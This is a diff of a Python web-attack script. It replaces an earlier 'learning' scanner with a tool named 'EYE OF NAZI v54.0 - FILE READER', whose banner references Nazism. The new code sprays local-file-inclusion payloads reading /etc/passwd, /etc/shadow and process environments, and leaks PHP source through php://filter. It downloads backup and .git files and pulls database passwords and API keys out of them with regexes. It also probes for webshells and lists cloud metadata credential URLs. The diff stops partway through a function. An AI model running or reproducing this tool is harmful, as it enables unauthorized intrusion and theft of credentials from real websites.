@@ -1,387 +1,787 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ============================================================
-#  ADVANCED CYBER SCANNER v2.0
-#  بۆ مەبەستی فێربوون و پشکنینی ماڵپەڕی خۆت
-#  Made by: Cyber Kurd Team (Updated)
-# ============================================================
+# EYE OF NAZI v54.0 - FILE READER
+# Made by Cyber Kurd Team
 
-import sys
-import os
-import re
-import ssl
-import time
-import json
-import socket
-import base64
-import urllib.parse
-import urllib.request
-import urllib.error
+import sys, os, re, ssl, time, json, base64
+import urllib.parse, urllib.request, urllib.error
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-# ====================== پشکنینی کتێبخانەکان ======================
-try:
-    import requests
-    from bs4 import BeautifulSoup
-    from colorama import Fore, Style, init
-    init(autoreset=True)
-except ImportError:
-    print("[!] تکایە سەرەتا ئەم فەرمانە بنووسە:")
-    print("pip install requests beautifulsoup4 colorama urllib3")
-    sys.exit(1)
-
-# ناچالاککردنی ئاگاداری SSL
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ====================== ڕێکخستنەکان ======================
-TIMEOUT = 10
-THREADS = 25
-USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-
-# ====================== لیستی فایلەکان ======================
-COMMON_FILES = [
-    "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-config.php.save",
-    "wp-config.php~", "wp-config.php.swp", "wp-config.txt", "config.php",
-    "config.php.bak", "config.php.old", "configuration.php", "settings.php",
-    "database.php", "db.php", "connect.php", "connection.php", "functions.php",
-    "includes/config.php", "includes/db.php", "admin/config.php", "admin/config.inc.php",
-    "application/config.php", "app/config.php", "core/config.php", "system/config.php",
-    "library/config.php", "src/config.php", "index.php", "wp-load.php",
-    "wp-settings.php", "wp-includes/functions.php", "wp-admin/setup-config.php",
-    ".env", ".env.bak", ".env.old", ".env.save", ".git/config", ".git/HEAD",
-    "backup.zip", "backup.tar.gz", "backup.sql", "db.sql", "database.sql",
-    "phpinfo.php", "info.php", "test.php", "admin.php", "login.php",
-    "robots.txt", "sitemap.xml", ".htaccess", "composer.json", "package.json",
-    "Dockerfile", "docker-compose.yml", "web.config", "crossdomain.xml",
-    "admin/", "administrator/", "login/", "backup/", "uploads/", "files/",
-    "api/", "v1/", "v2/", "graphql", "swagger.json", "openapi.json"
-]
-
-# ====================== پەیڵۆدەکان ======================
-LFI_PAYLOADS = [
-    "../../../../etc/passwd",
-    "../../../../etc/passwd%00",
-    "....//....//....//etc/passwd",
-    "..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "/etc/passwd",
-    "C:\\Windows\\win.ini",
-    "..\\..\\..\\..\\Windows\\win.ini",
-    "php://filter/convert.base64-encode/resource=index.php",
-    "php://filter/read=convert.base64-encode/resource=config.php",
-    "/proc/self/environ",
-    "/var/log/apache2/access.log",
-]
-
-SQLI_PAYLOADS = [
-    "'",
-    "\"",
-    "1' OR '1'='1",
-    "1' OR '1'='1' --",
-    "1' UNION SELECT NULL--",
-    "1' AND SLEEP(5)--",
-    "admin'--",
-    "' OR 1=1#",
-    "1' AND 1=1--",
-    "1' AND 1=2--",
-    "') OR ('1'='1",
-    "1' WAITFOR DELAY '0:0:5'--",
-]
-
-XSS_PAYLOADS = [
-    "<script>alert(1)</script>",
-    "\"><script>alert(1)</script>",
-    "'><script>alert(1)</script>",
-    "<img src=x onerror=alert(1)>",
-    "javascript:alert(1)",
-]
-
-# ====================== نیشانەکان ======================
-LFI_SIGNS = ["root:x:0:0", "[extensions]", "<?php", "define(", "DB_PASSWORD", "DOCUMENT_ROOT"]
-SQLI_SIGNS = ["SQL syntax", "mysql_fetch", "You have an error in your SQL", "Warning: mysql", "ORA-", "PostgreSQL", "SQLite"]
-XSS_SIGNS = ["<script>alert(1)</script>", "onerror=alert(1)", "javascript:alert(1)"]
-
-# ====================== دەرگا باوەکان ======================
-COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
-
-# ====================== فەنکشنەکان ======================
-
-def print_banner():
-    """پیشاندانی لۆگۆی گەورە و ڕەنگاوڕەنگ"""
-    logo = f"""
-{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║  {Fore.RED}███████╗██╗   ██╗███████╗     ██████╗ ███████╗    ███╗   ██╗ █████╗ ███████╗██╗{Fore.CYAN}  ║
-║  {Fore.RED}██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝    ████╗  ██║██╔══██╗╚══███╔╝██║{Fore.CYAN}  ║
-║  {Fore.RED}█████╗   ╚████╔╝ █████╗      ██║   ██║█████╗      ██╔██╗ ██║███████║  ███╔╝ ██║{Fore.CYAN}  ║
-║  {Fore.RED}██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝      ██║╚██╗██║██╔══██║ ███╔╝  ██║{Fore.CYAN}  ║
-║  {Fore.RED}███████╗   ██║   ███████╗    ╚██████╔╝██║         ██║ ╚████║██║  ██║███████╗██║{Fore.CYAN}  ║
-║  {Fore.RED}╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝         ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝{Fore.CYAN}  ║
-║                                                                              ║
-║  {Fore.YELLOW}              ADVANCED CYBER SCANNER v2.0 - SOURCE HUNTER{Fore.CYAN}                ║
-║  {Fore.GREEN}                    Made by: Cyber Kurd Team{Fore.CYAN}                            ║
-║  {Fore.MAGENTA}                    بۆ مەبەستی فێربوون و پشکنینی ماڵپەڕی خۆت{Fore.CYAN}                 ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+LOGO = r"""
+\033[91m\033[1m
+   ███████╗██╗   ██╗███████╗     ██████╗ ███████╗     ███╗   ██╗ █████╗ ███████╗██╗
+   ██╔════╝╚██╗ ██╔╝██╔════╝    ██╔═══██╗██╔════╝     ████╗  ██║██╔══██╗╚══███╔╝██║
+   █████╗   ╚████╔╝ █████╗      ██║   ██║█████╗       ██╔██╗ ██║███████║  ███╔╝ ██║
+   ██╔══╝    ╚██╔╝  ██╔══╝      ██║   ██║██╔══╝       ██║╚██╗██║██╔══██║ ███╔╝  ██║
+   ███████╗   ██║   ███████╗    ╚██████╔╝██║          ██║ ╚████║██║  ██║███████╗██║
+   ╚══════╝   ╚═╝   ╚══════╝     ╚═════╝ ╚═╝          ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝
+\033[0m\033[93m\033[1m                    EYE OF NAZI
+\033[96m=============================================================\033[0m
+\033[97m\033[1m              FILE READER v54.0\033[0m
+\033[2m              Made by Cyber Kurd Team\033[0m
+\033[96m=============================================================\033[0m
 """
-    print(logo)
 
-def get_headers():
-    return {"User-Agent": USER_AGENT}
+# 50+ URL parameters to test for LFI
+LFI_PARAMS = [
+    'file', 'page', 'path', 'include', 'inc', 'load', 'read',
+    'view', 'template', 'tpl', 'dir', 'folder', 'root', 'doc',
+    'document', 'filename', 'name', 'url', 'src', 'source',
+    'content', 'show', 'display', 'cat', 'category', 'id',
+    'pid', 'post', 'article', 'news', 'item', 'product',
+    'mod', 'module', 'action', 'do', 'go', 'goto', 'link',
+    'redirect', 'target', 'dest', 'destination', 'r', 'u',
+    'f', 'p', 'l', 'c', 'm', 'lang', 'language', 'locale',
+]
 
-def fetch_url(url):
-    """هێنانی ناوەڕۆکی لاپەڕەیەک"""
-    try:
-        response = requests.get(url, headers=get_headers(), timeout=TIMEOUT, verify=False, allow_redirects=True)
-        return response
-    except Exception:
-        return None
+# LFI payloads
+LFI_PAYLOADS = [
+    '../../../../../../etc/passwd',
+    '../../../../../../etc/shadow',
+    '../../../../../../etc/hosts',
+    '../../../../../../etc/hostname',
+    '../../../../../../etc/group',
+    '../../../../../../proc/self/environ',
+    '../../../../../../proc/self/cmdline',
+    '../../../../../../proc/version',
+    '../../../../../../var/log/apache2/access.log',
+    '../../../../../../var/log/auth.log',
+    '../../../../../../windows/win.ini',
+    '..\\..\\..\\..\\..\\..\\windows\\win.ini',
+    '....//....//....//....//....//etc/passwd',
+    '..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
+    '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
+    'php://filter/convert.base64-encode/resource=index.php',
+    'php://filter/convert.base64-encode/resource=config.php',
+    'php://filter/convert.base64-encode/resource=wp-config.php',
+    'php://filter/convert.base64-encode/resource=.env',
+    'php://input',
+    'php://stdin',
+    'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+',
+    'expect://id',
+    'file:///etc/passwd',
+    'file:///c:/windows/win.ini',
+    '/etc/passwd',
+    '/etc/shadow',
+    '/proc/self/environ',
+    '/var/log/apache2/access.log',
+]
 
-def crawl_site(base_url):
-    """گەڕان بەدوای لینک و فۆڕمەکان"""
-    print(f"\n{Fore.BLUE}[*] دەستپێکردنی گەڕان (Crawling) بۆ: {base_url}{Style.RESET_ALL}")
-    links = set()
-    forms = []
-    
-    response = fetch_url(base_url)
-    if not response:
-        print(f"{Fore.RED}[!] نەتوانرا لاپەڕەکە بکرێتەوە.{Style.RESET_ALL}")
-        return links, forms
+LFI_INDICATORS = [
+    'root:x:0:0', 'root:*:0:0', 'daemon:x:', 'bin:x:', 'sys:x:',
+    'www-data:', 'nobody:x:', 'sshd:x:',
+    '[extensions]', '[fonts]', '[mci extensions]',
+    '[boot loader]', '[operating systems]',
+    'for 16-bit app support',
+]
 
-    soup = BeautifulSoup(response.text, 'html.parser')
+# Backup files
+BACKUP_FILES = [
+    'wp-config.php.bak', 'wp-config.php~', 'wp-config.php.old',
+    'wp-config.php.save', 'wp-config.php.orig', 'wp-config.php.txt',
+    'wp-config.php.swp', 'wp-config.php.swo', 'wp-config.txt',
+    '.wp-config.php.swp', '.#wp-config.php',
+    'config.php.bak', 'config.php~', 'config.php.old',
+    'config.php.save', 'config.php.orig', 'config.php.txt',
+    'config.php.swp', 'config.php.swo',
+    'configuration.php.bak', 'configuration.php~',
+    'config.inc.php.bak', 'config.inc.php~',
+    'settings.php.bak', 'settings.php~',
+    'database.php.bak', 'database.php~',
+    'db.php.bak', 'db.php~',
+    'index.php.bak', 'index.php~', 'index.php.old',
+    'index.php.save', 'index.php.orig', 'index.php.txt',
+    '.index.php.swp', '.index.php.swo',
+    'functions.php.bak', 'functions.php~',
+    '.env.bak', '.env.old', '.env.save', '.env.orig',
+    '.env.backup', '.env.txt', '.env.example',
+    'config.json.bak', 'config.json~', 'config.json.old',
+    'config.yml.bak', 'config.yml~', 'config.yaml.bak',
+    'settings.py.bak', 'settings.py~',
+    'database.yml.bak', 'database.yml~',
+    'phpinfo.php.bak', 'phpinfo.php~',
+    'info.php.bak', 'info.php~',
+    'test.php.bak', 'test.php~',
+    '.htaccess.bak', '.htaccess~', '.htaccess.old',
+    'web.config.bak', 'web.config~',
+]
 
-    for a_tag in soup.find_all('a', href=True):
-        link = urllib.parse.urljoin(base_url, a_tag['href'])
-        if base_url.split('//')[1].split('/')[0] in link:
-            links.add(link)
+# Git exposure files
+GIT_FILES = [
+    '.git/config', '.git/HEAD', '.git/index',
+    '.git/logs/HEAD', '.git/refs/heads/master',
+    '.git/refs/heads/main', '.git/COMMIT_EDITMSG',
+    '.git/description', '.git/info/exclude',
+    '.gitignore', '.gitmodules', '.gitattributes',
+    '.svn/entries', '.svn/wc.db',
+    '.hg/hgrc', '.hgignore',
+    '.git-credentials', '.gitconfig',
+]
 
-    for form in soup.find_all('form'):
-        action = form.get('action', '')
-        method = form.get('method', 'get').lower()
-        inputs = []
-        for inp in form.find_all(['input', 'textarea']):
-            name = inp.get('name')
-            if name:
-                inputs.append(name)
-        forms.append({"action": urllib.parse.urljoin(base_url, action), "method": method, "inputs": inputs})
+# PHP source files
+PHP_FILES = [
+    'wp-config.php', 'config.php', 'configuration.php',
+    'config.inc.php', 'settings.php', 'database.php',
+    'db.php', 'connect.php', 'connection.php',
+    'includes/config.php', 'includes/db.php',
+    'admin/config.php', 'application/config.php',
+    'app/config.php', 'core/config.php', 'system/config.php',
+    'index.php', 'wp-load.php', 'wp-settings.php',
+    'wp-includes/version.php',
+]
 
-    print(f"{Fore.GREEN}[+] {len(links)} لینک و {len(forms)} فۆڕم دۆزرایەوە.{Style.RESET_ALL}")
-    return links, forms
+# Password patterns
+PASS_PATTERNS = [
+    r'define\s*\(\s*[\'"]DB_NAME[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_USER[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_PASSWORD[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'define\s*\(\s*[\'"]DB_HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]',
+    r'DB_PASSWORD\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'DB_PASS\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'DB_USER\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'DB_NAME\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'DB_HOST\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'password["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'passwd["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'secret["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'api[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'token["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'access[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'secret[_-]?key["\']?\s*[:=]\s*["\']([^"\'\s]{3,80})["\']',
+    r'AKIA[0-9A-Z]{16}',
+    r'ghp_[0-9a-zA-Z]{36}',
+    r'sk_live_[0-9a-zA-Z]{24,}',
+    r'AIza[0-9A-Za-z\-_]{35}',
+]
 
-def test_lfi(url):
-    """پشکنینی LFI"""
-    parsed = urllib.parse.urlparse(url)
-    params = urllib.parse.parse_qs(parsed.query)
-    findings = []
-    
-    if not params:
-        return findings
+# CMS detectors
+CMS_PATHS = {
+    'Joomla': ['administrator/', 'components/', 'modules/',
+               'plugins/', 'templates/', 'language/',
+               'configuration.php', 'htaccess.txt', 'web.config.txt'],
+    'Drupal': ['sites/default/', 'core/', 'modules/',
+               'themes/', 'profiles/', 'CHANGELOG.txt',
+               'INSTALL.txt', 'README.txt'],
+    'Laravel': ['storage/', 'bootstrap/', 'artisan',
+                'composer.json', 'composer.lock', '.env',
+                'config/app.php', 'config/database.php'],
+    'Django': ['static/', 'media/', 'manage.py',
+               'requirements.txt', 'settings.py', 'urls.py',
+               'wsgi.py', 'asgi.py'],
+    'CodeIgniter': ['application/', 'system/', 'index.php',
+                    'composer.json', '.env'],
+    'Symfony': ['bin/', 'config/', 'public/', 'src/',
+                'templates/', 'var/', 'vendor/', 'composer.json'],
+}
 
-    for param in params:
-        for payload in LFI_PAYLOADS:
-            new_params = params.copy()
-            new_params[param] = [payload]
-            new_query = urllib.parse.urlencode(new_params, doseq=True)
-            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-            
-            response = fetch_url(new_url)
-            if response:
-                for sign in LFI_SIGNS:
-                    if sign in response.text:
-                        findings.append({"url": new_url, "param": param, "payload": payload})
-                        print(f"{Fore.RED}[!] LFI دۆزرایەوە: {new_url}{Style.RESET_ALL}")
-                        break
-    return findings
+# API endpoints
+API_ENDPOINTS = [
+    'api', 'api/', 'api/v1', 'api/v1/', 'api/v2', 'api/v2/',
+    'api/v3', 'api/v3/', 'api/v4', 'api/v4/',
+    'api/users', 'api/user', 'api/admin', 'api/login',
+    'api/auth', 'api/config', 'api/status', 'api/health',
+    'api/version', 'api/info', 'api/data', 'api/list',
+    'api/search', 'api/upload', 'api/download', 'api/file',
+    'api/me', 'api/profile', 'api/account', 'api/settings',
+    'rest', 'rest/', 'rest/api', 'rest/v1', 'rest/v1/',
+    'rest/v2', 'rest/users', 'rest/admin',
+    'graphql', 'graphiql', 'graphql.php',
+    'swagger', 'swagger.json', 'swagger.yaml',
+    'openapi.json', 'openapi.yaml', 'api-docs', 'api-docs/',
+    'docs', 'docs/', 'documentation',
+    'json', 'json/', 'xml', 'xml/', 'rss', 'rss/', 'atom',
+]
 
-def test_sqli(url):
-    """پشکنینی SQL Injection"""
-    parsed = urllib.parse.urlparse(url)
-    params = urllib.parse.parse_qs(parsed.query)
-    findings = []
-    
-    if not params:
-        return findings
+# Shell files
+SHELL_FILES = [
+    'shell.php', 'cmd.php', 'c99.php', 'r57.php', 'b374k.php',
+    'webshell.php', 'backdoor.php', 'hack.php', 'upload.php',
+    'test.php', 'tmp.php', 'x.php', '1.php', 'a.php',
+    '.shell.php', 'shell.phtml', 'shell.php5', 'shell.php7',
+]
 
-    for param in params:
-        for payload in SQLI_PAYLOADS:
-            new_params = params.copy()
-            new_params[param] = [payload]
-            new_query = urllib.parse.urlencode(new_params, doseq=True)
-            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-            
-            response = fetch_url(new_url)
-            if response:
-                for sign in SQLI_SIGNS:
-                    if sign.lower() in response.text.lower():
-                        findings.append({"url": new_url, "param": param, "payload": payload})
-                        print(f"{Fore.RED}[!] SQLI دۆزرایەوە: {new_url}{Style.RESET_ALL}")
-                        break
-    return findings
+# Cloud metadata
+CLOUD_METADATA = [
+    'http://169.254.169.254/latest/meta-data/',
+    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    'http://metadata.google.internal/computeMetadata/v1/',
+    'http://100.100.100.200/latest/meta-data/',
+]
+# ═══════════════════════════════════════════════════════════════════════════
+# HTTP CLIENT
+# ═══════════════════════════════════════════════════════════════════════════
 
-def test_xss(url):
-    """پشکنینی XSS"""
-    parsed = urllib.parse.urlparse(url)
-    params = urllib.parse.parse_qs(parsed.query)
-    findings = []
-    
-    if not params:
-        return findings
+class Client:
+    def __init__(self, timeout=10, cookie=None, proxy=None):
+        self.timeout = timeout
+        self.cookie = cookie
+        self.proxy = proxy
+        self.ua = "Mozilla/5.0 (Linux; Android 14) Chrome/120.0 Mobile"
 
-    for param in params:
-        for payload in XSS_PAYLOADS:
-            new_params = params.copy()
-            new_params[param] = [payload]
-            new_query = urllib.parse.urlencode(new_params, doseq=True)
-            new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
-            
-            response = fetch_url(new_url)
-            if response and payload in response.text:
-                findings.append({"url": new_url, "param": param, "payload": payload})
-                print(f"{Fore.RED}[!] XSS دۆزرایەوە: {new_url}{Style.RESET_ALL}")
-                break
-    return findings
-
-def check_file(base_url, file_path):
-    """پشکنینی بوونی فایلێک"""
-    url = urllib.parse.urljoin(base_url, file_path)
-    response = fetch_url(url)
-    if response and response.status_code == 200:
-        content_length = len(response.content)
-        if content_length > 0:
-            return {"url": url, "file": file_path, "size": content_length}
-    return None
-
-def scan_files(base_url):
-    """پشکنینی فایلەکان بە خێرایی"""
-    print(f"\n{Fore.BLUE}[*] دەستپێکردنی پشکنینی فایلەکان...{Style.RESET_ALL}")
-    findings = []
-    
-    with ThreadPoolExecutor(max_workers=THREADS) as executor:
-        futures = {executor.submit(check_file, base_url, f): f for f in COMMON_FILES}
-        for future in as_completed(futures):
-            result = future.result()
-            if result:
-                findings.append(result)
-                print(f"{Fore.RED}[!] فایل دۆزرایەوە: {result['url']} (قەبارە: {result['size']} بایت){Style.RESET_ALL}")
-    
-    return findings
-
-def scan_ports(host):
-    """پشکنینی دەرگاکان (Port Scanning)"""
-    print(f"\n{Fore.BLUE}[*] دەستپێکردنی پشکنینی دەرگاکان بۆ: {host}{Style.RESET_ALL}")
-    open_ports = []
-    
-    def check_port(port):
+    def req(self, url):
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        if self.proxy:
+            h = urllib.request.ProxyHandler({'http': self.proxy, 'https': self.proxy})
+            op = urllib.request.build_opener(h, urllib.request.HTTPSHandler(context=ctx))
+        else:
+            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
+        hdrs = {'User-Agent': self.ua, 'Accept': '*/*', 'Connection': 'close'}
+        if self.cookie:
+            hdrs['Cookie'] = self.cookie
+        r = urllib.request.Request(url, headers=hdrs)
+        t0 = time.time()
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(2)
-            result = sock.connect_ex((host, port))
-            sock.close()
-            if result == 0:
-                return port
-        except Exception:
-            pass
-        return None
+            rp = op.open(r, timeout=self.timeout)
+            body = rp.read()
+            return {'s': rp.getcode(), 't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'dt': time.time() - t0, 'err': None}
+        except urllib.error.HTTPError as e:
+            try:
+                body = e.read()
+            except Exception:
+                body = b''
+            return {'s': e.code, 't': body.decode('utf-8', 'ignore'),
+                    'n': len(body), 'dt': time.time() - t0, 'err': None}
+        except Exception as e:
+            return {'s': 0, 't': '', 'n': 0, 'dt': time.time() - t0, 'err': str(e)}
 
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(check_port, p): p for p in COMMON_PORTS}
-        for future in as_completed(futures):
-            port = future.result()
-            if port:
-                open_ports.append(port)
-                print(f"{Fore.GREEN}[+] دەرگا کراوە: {port}{Style.RESET_ALL}")
-    
-    return open_ports
+# ═══════════════════════════════════════════════════════════════════════════
+# SCANNER CLASS
+# ═══════════════════════════════════════════════════════════════════════════
 
-def save_report(data, filename):
-    """پاشەکەوتکردنی ڕاپۆرت بە JSON"""
-    with open(filename, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=4, ensure_ascii=False)
-    print(f"{Fore.GREEN}[+] ڕاپۆرت پاشەکەوتکرا: {filename}{Style.RESET_ALL}")
+class Scan:
+    def __init__(self, url, cl, threads=30):
+        self.url = url.rstrip('/')
+        self.cl = cl
+        self.threads = threads
+        self.f = []
+        self.nt = 0
+        self.np = 0
+        self.checked = 0
+        self.files_read = []
+        self.passwords = []
+
+    def add(self, u, p, t, pl, ev, sev):
+        self.f.append({'url': u, 'param': p, 'type': t, 'payload': pl,
+                       'evidence': ev[:300] if ev else '', 'severity': sev})
+        icons = {
+            'LFI': '\033[95m[LFI]\033[0m',
+            'FILE': '\033[92m[FILE]\033[0m',
+            'PHP': '\033[41m\033[97m[PHP]\033[0m',
+            'BACKUP': '\033[92m[BACKUP]\033[0m',
+            'GIT': '\033[41m\033[97m[GIT]\033[0m',
+            'PASSWORD': '\033[41m\033[97m[PASSWORD]\033[0m',
+            'CMS': '\033[96m[CMS]\033[0m',
+            'API': '\033[96m[API]\033[0m',
+            'SHELL': '\033[41m\033[97m[SHELL]\033[0m',
+            'CLOUD': '\033[41m\033[97m[CLOUD]\033[0m',
+        }
+        icon = icons.get(t, '[' + t + ']')
+        print("\n  " + icon + " \033[1m" + sev + "\033[0m")
+        print("    URL     : " + u[:120])
+        if p:
+            print("    Param   : \033[93m" + p + "\033[0m")
+        if pl:
+            print("    Payload : " + pl[:80])
+        if ev:
+            print("    Evidence: " + ev[:250])
+
+    def inject(self, url, param, payload):
+        pr = urllib.parse.urlparse(url)
+        qs = urllib.parse.parse_qs(pr.query, keep_blank_values=True)
+        qs[param] = [payload]
+        new_q = urllib.parse.urlencode(qs, doseq=True)
+        return urllib.parse.urlunparse((pr.scheme, pr.netloc, pr.path,
+                                         pr.params, new_q, pr.fragment))
+
+    def params(self, url):
+        q = urllib.parse.urlparse(url).query
+        if not q:
+            return []
+        return list(urllib.parse.parse_qs(q, keep_blank_values=True).keys())
+
+    def get_forms(self, url):
+        r = self.cl.req(url)
+        if r['err'] or not r['t']:
+            return []
+        forms = []
+        for fm in re.finditer(r'<form[^>]*>(.*?)</form>',
+                              r['t'], re.DOTALL | re.IGNORECASE):
+            html = fm.group(1)
+            am = re.search(r'action=["\']([^"\']*)["\']', html, re.IGNORECASE)
+            mm = re.search(r'method=["\']([^"\']*)["\']', html, re.IGNORECASE)
+            action = am.group(1) if am else url
+            method = (mm.group(1) if mm else 'get').lower()
+            if not action or action == '#':
+                action = url
+            elif not action.startswith(('http://', 'https://')):
+                action = urllib.parse.urljoin(url, action)
+            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                                html, re.IGNORECASE)
+            inputs += re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\'][^>]*>',
+                                 html, re.IGNORECASE)
+            if inputs:
+                forms.append({'action': action, 'method': method,
+                              'inputs': list(set(inputs))})
+        return forms
+
+    def crawl_links(self, url):
+        r = self.cl.req(url)
+        if r['err'] or not r['t']:
+            return []
+        links = set()
+        for m in re.finditer(r'href=["\']([^"\']+)["\']',
+                             r['t'], re.IGNORECASE):
+            lk = m.group(1)
+            if lk.startswith(('javascript:', '#', 'mailto:', 'tel:')):
+                continue
+            full = urllib.parse.urljoin(url, lk)
+            if self.url.split('//')[1].split('/')[0] in full:
+                links.add(full)
+        return list(links)
+
+    def extract_passwords(self, text):
+        results = []
+        for pat in PASS_PATTERNS:
+            try:
+                for m in re.findall(pat, text, re.IGNORECASE):
+                    if isinstance(m, tuple):
+                        for x in m:
+                            if x and 3 <= len(x) <= 200:
+                                results.append(x)
+                    elif m and 3 <= len(m) <= 200:
+                        results.append(m)
+            except Exception:
+                pass
+        return list(set(results))
+
+    def check_path(self, base, path):
+        url = base.rstrip('/') + '/' + path.lstrip('/')
+        r = self.cl.req(url)
+        self.checked += 1
+        if r['err'] or r['s'] != 200:
+            return None
+        return {'url': url, 's': r['s'], 'n': r['n'], 'path': path, 'text': r['t']}
+def test_lfi_auto(self, url):
+    """Test all URL parameters with LFI payloads"""
+    print("\n\033[96m[1/7]\033[0m LFI Auto Params...")
+    params_found = self.params(url)
+    # Also test common params even if not in URL
+    all_params = list(set(params_found + LFI_PARAMS))
+    total = 0
+    found = 0
+    for p in all_params:
+        for pl in LFI_PAYLOADS[:10]:
+            test_url = self.inject(url, p, pl)
+            r = self.cl.req(test_url)
+            total += 1
+            if r['err']:
+                continue
+            hit = False
+            for ind in LFI_INDICATORS:
+                if ind in r['t']:
+                    self.add(test_url, p, 'LFI', pl,
+                             "File leaked: " + ind, "CRITICAL")
+                    self.files_read.append({'url': test_url, 'param': p,
+                                            'payload': pl, 'indicator': ind,
+                                            'content': r['t'][:500]})
+                    found += 1
+                    hit = True
+                    break
+            if hit:
+                break
+    print("  \033[92m[+]\033[0m Tested " + str(total) + " | Found " + str(found))
+
+def test_php_filter(self, url):
+    """Test PHP filter wrapper"""
+    print("\n\033[96m[2/7]\033[0m PHP Filter...")
+    params = self.params(url)
+    if not params:
+        params = ['file', 'page', 'path', 'include']
+    filter_payloads = [
+        'php://filter/convert.base64-encode/resource=index.php',
+        'php://filter/convert.base64-encode/resource=config.php',
+        'php://filter/convert.base64-encode/resource=wp-config.php',
+        'php://filter/convert.base64-encode/resource=.env',
+        'php://filter/read=convert.base64-encode/resource=index.php',
+        'php://filter/read=string.rot13/resource=index.php',
+    ]
+    found = 0
+    for p in params[:5]:
+        for pl in filter_payloads:
+            test_url = self.inject(url, p, pl)
+            r = self.cl.req(test_url)
+            if r['err'] or r['s'] != 200:
+                continue
+            # Try to decode base64
+            try:
+                b64_match = re.search(r'[A-Za-z0-9+/=]{40,}', r['t'])
+                if b64_match:
+                    decoded = base64.b64decode(b64_match.group(0)).decode('utf-8', 'ignore')
+                    if '<?php' in decoded or 'DB_' in decoded or 'password' in decoded.lower():
+                        self.add(test_url, p, 'PHP', pl,
+                                 "PHP source leaked (base64 decoded)",
+                                 "CRITICAL")
+                        self.files_read.append({'url': test_url, 'param': p,
+                                                'payload': pl, 'content': decoded[:500]})
+                        found += 1
+                        break
+            except Exception:
+                pass
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_backup(self, url):
+    """Test backup files"""
+    print("\n\033[96m[3/7]\033[0m Backup Files (" + str(len(BACKUP_FILES)) + ")...")
+    found = 0
+    with ThreadPoolExecutor(max_workers=self.threads) as ex:
+        futures = {}
+        for p in BACKUP_FILES:
+            futures[ex.submit(self.check_path, url, p)] = p
+        for fut in as_completed(futures):
+            try:
+                res = fut.result()
+                if res and res['n'] > 0:
+                    self.add(res['url'], '', 'BACKUP', '',
+                             "Backup exposed (" + str(res['n']) + "B)",
+                             "CRITICAL")
+                    # Try to extract passwords
+                    pwds = self.extract_passwords(res['text'])
+                    for pwd in pwds[:3]:
+                        self.passwords.append({'url': res['url'],
+                                               'password': pwd})
+                        self.add(res['url'], '', 'PASSWORD', pwd,
+                                 "Password found", "CRITICAL")
+                    found += 1
+            except Exception:
+                pass
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_git(self, url):
+    """Test git exposure"""
+    print("\n\033[96m[4/7]\033[0m Git Exposure (" + str(len(GIT_FILES)) + ")...")
+    found = 0
+    with ThreadPoolExecutor(max_workers=self.threads) as ex:
+        futures = {}
+        for p in GIT_FILES:
+            futures[ex.submit(self.check_path, url, p)] = p
+        for fut in as_completed(futures):
+            try:
+                res = fut.result()
+                if res and res['n'] > 0:
+                    self.add(res['url'], '', 'GIT', '',
+                             "Git file exposed (" + str(res['n']) + "B)",
+                             "CRITICAL")
+                    found += 1
+            except Exception:
+                pass
+    print("  \033[92m[+]\033[0m Found " + str(found))
+
+def test_php_source(self, url):
